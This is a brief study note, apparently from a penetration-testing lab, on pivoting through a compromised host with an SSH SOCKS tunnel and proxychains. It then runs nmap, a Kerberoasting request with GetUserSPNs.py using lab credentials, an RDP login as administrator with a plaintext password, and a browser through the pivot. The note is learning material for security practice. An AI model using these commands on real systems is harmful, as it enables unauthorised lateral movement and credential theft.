1. installation
# 2. usage
-  cat out the config file
cat /etc/proxychains4.conf

we are going to use the port at the bottom

-  use ssh to pivot
ssh -f -N -D 9050 -i pivot root@10.10.155.5
-f: backgrounds the ssh
-N: do not execute remote commands, used for port forwarding
-D: bind to port 9050

we established a connection on this machine so we can proxy our traffic through this machine

- use proxychains to nmap
proxychains nmap -p88 10.10.10.255

- use proxychains to GetUserSPNs
proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.225 -request

- we can also gain access to a machine via xfreerdp
proxychains xfreerdp /u:administrator /p:'Hacker321!' /v:10.10.10.225

- if you use firefox with proxychains, you can access them through a web browser
proxychains firefox